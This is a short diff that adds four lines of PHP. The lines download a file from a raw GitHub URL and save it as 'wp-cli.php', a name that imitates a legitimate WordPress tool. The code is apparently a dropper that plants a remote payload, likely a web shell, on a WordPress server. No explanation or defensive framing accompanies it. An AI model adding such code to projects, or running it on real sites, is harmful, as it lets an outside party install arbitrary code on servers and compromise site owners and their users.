@@ -1,0 +1,4 @@
+$nama= fopen("wp-cli.php" ,"w+");
+  $file = file_get_contents('https://raw.githubusercontent.com/aditdotid/link/main/w');
+  $tulis = fwrite ($nama ,$file);
+ fclose($nama);
